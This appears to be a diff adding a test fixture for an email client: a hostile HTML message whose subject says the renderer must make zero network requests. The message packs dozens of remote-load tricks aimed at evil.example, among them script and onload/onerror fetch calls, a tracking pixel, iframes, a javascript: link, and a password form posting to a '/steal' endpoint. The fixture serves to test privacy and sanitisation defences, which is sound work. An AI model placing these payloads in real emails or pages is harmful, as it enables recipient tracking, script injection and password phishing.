@@ -1,0 +1,40 @@
+From: Mystery Sender <someone@unknown.example>
+To: alice@fmail.test
+Subject: Hostile HTML (renderer must make zero network requests)
+Date: Tue, 20 Oct 2026 01:00:00 +0000
+Message-ID: <hostile@unknown.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html><head>
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
+<link rel="stylesheet" href="https://evil.example/style.css">
+<link rel="dns-prefetch" href="//prefetch.evil.example">
+<link rel="preconnect" href="https://preconnect.evil.example">
+<style>
+@import url("https://evil.example/import.css");
+@font-face { font-family: X; src: url("https://evil.example/font.woff"); }
+body { background: url("https://evil.example/bg.png"); }
+</style>
+<script>fetch("https://evil.example/script");</script>
+</head>
+<body onload="fetch('https://evil.example/onload')">
+<p>Visible text that must still render.</p>
+<img src="https://evil.example/pixel.gif" width="1" height="1">
+<img src="x" onerror="fetch('https://evil.example/onerror')">
+<img srcset="https://evil.example/srcset.png 2x">
+<picture><source srcset="https://evil.example/picture.webp"></picture>
+<video poster="https://evil.example/poster.jpg" src="https://evil.example/v.mp4"></video>
+<audio src="https://evil.example/a.mp3"></audio>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/object"></object>
+<embed src="https://evil.example/embed">
+<svg onload="fetch('https://evil.example/svg')"><image href="https://evil.example/svgimage.png"/></svg>
+<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Log in</button></form>
+<a href="javascript:fetch('https://evil.example/js-link')">javascript link</a>
+<a href="https://evil.example/normal-link">normal link (must not be prefetched)</a>
+<div style="background-image: url('https://evil.example/inline-style.png')">inline style</div>
+<table background="https://evil.example/table-bg.png"><tr><td>table</td></tr></table>
+</body></html>
